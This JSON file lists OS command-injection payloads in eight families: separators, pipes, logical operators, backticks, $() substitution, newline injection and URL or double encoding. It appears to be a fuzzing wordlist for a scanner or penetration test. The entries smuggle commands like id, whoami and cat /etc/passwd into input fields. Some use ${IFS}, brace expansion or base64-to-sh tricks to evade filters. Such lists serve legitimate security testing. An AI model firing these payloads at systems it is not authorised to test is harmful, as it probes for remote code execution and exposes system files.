{
    "payload_families": {
        "command_separator": {
            "description": "Semicolon-separated command injection",
            "payloads": [
                "; id",
                "; whoami",
                "; pwd",
                "; cat /etc/passwd",
                "; uname -a",
                "127.0.0.1; id",
                "127.0.0.1; whoami",
                "127.0.0.1; pwd",
                "127.0.0.1; cat /etc/passwd",
                "127.0.0.1; uname -a",
                "; id; echo done",
                "1; id",
                "127.0.0.1;${IFS}id",
                "127.0.0.1;\tid",
                "127.0.0.1;/bin/id",
                ";${IFS}whoami",
                "127.0.0.1;{id,}"
            ]
        },
        "pipe_operator": {
            "description": "Pipe operator to chain commands",
            "payloads": [
                "| id",
                "| whoami",
                "| cat /etc/passwd",
                "| ls -la",
                "127.0.0.1 | id",
                "127.0.0.1 | whoami",
                "127.0.0.1 | cat /etc/passwd",
                "127.0.0.1 | ls -la",
                "| id | echo",
                "1 | id",
                "127.0.0.1|${IFS}id",
                "127.0.0.1|\tid",
                "127.0.0.1|/usr/bin/id",
                "|{id,}",
                "127.0.0.1|cat${IFS}/etc/passwd"
            ]
        },
        "logical_and": {
            "description": "Logical AND operator for conditional execution",
            "payloads": [
                "&& id",
                "&& whoami",
                "127.0.0.1 && id",
                "127.0.0.1 && whoami",
                "127.0.0.1 && cat /etc/passwd",
                "1 && id",
                "1 && whoami",
                "& id",
                "& whoami",
                "127.0.0.1& id",
                "127.0.0.1${IFS}&&${IFS}id",
                "127.0.0.1&&/bin/sh${IFS}-c${IFS}id",
                "127.0.0.1&&{id,}",
                "127.0.0.1&&cat${IFS}/etc/passwd"
            ]
        },
        "logical_or": {
            "description": "Logical OR operator for alternative execution",
            "payloads": [
                "|| id",
                "|| whoami",
                "nonexistent || id",
                "nonexistent || whoami",
                "invalid || id",
                "|| cat /etc/passwd",
                "127.0.0.1 || id",
                "INVALID || id",
                "0 || id",
                "x || whoami"
            ]
        },
        "backtick_exec": {
            "description": "Backtick command substitution",
            "payloads": [
                "`id`",
                "`whoami`",
                "127.0.0.1`id`",
                "127.0.0.1`whoami`",
                "`cat /etc/passwd`",
                "1`id`",
                "`uname -a`",
                "`pwd`",
                "test`id`test",
                "127.0.0.1 `id`",
                "`/bin/id`",
                "`cat${IFS}/etc/passwd`",
                "127.0.0.1`/usr/bin/whoami`",
                "1`id|base64`"
            ]
        },
        "dollar_paren": {
            "description": "Dollar-paren command substitution $(cmd)",
            "payloads": [
                "$(id)",
                "$(whoami)",
                "127.0.0.1$(id)",
                "127.0.0.1$(whoami)",
                "$(cat /etc/passwd)",
                "1$(id)",
                "$(uname -a)",
                "$(pwd)",
                "test$(id)test",
                "127.0.0.1 $(id)",
                "$(echo${IFS}aWQ=|base64${IFS}-d|sh)",
                "$(id${IFS}2>&1)",
                "127.0.0.1$(cat${IFS}/etc/passwd)",
                "$(/usr/bin/id)"
            ]
        },
        "newline_inject": {
            "description": "Newline / URL-encoded newline injection",
            "payloads": [
                "%0aid",
                "%0a whoami",
                "\\nid",
                "127.0.0.1%0aid",
                "127.0.0.1%0awhoami",
                "%0a id %0a",
                "127.0.0.1\nid",
                "%0a/usr/bin/id",
                "1%0awhoami",
                "%0a cat /etc/passwd",
                "127.0.0.1%0d%0aid",
                "127.0.0.1%0a/bin/sh%20-c%20id",
                "127.0.0.1%0a${IFS}id",
                "127.0.0.1\rid",
                "%0awhoami%0a"
            ]
        },
        "encoded": {
            "description": "URL/double-encoded command injection variants",
            "payloads": [
                "%3Bid",
                "%7Cid",
                "%26%26id",
                "%3B whoami",
                "%7C whoami",
                "%26id",
                "%3Bwhoami%3B",
                "%60id%60",
                "%24%28id%29",
                "%7C%7C id",
                "%253Bid",
                "%25%37%43id",
                "%2526%2526id",
                "%2560id%2560",
                "%26%26%2Fbin%2Fid"
            ]
        }
    }
}
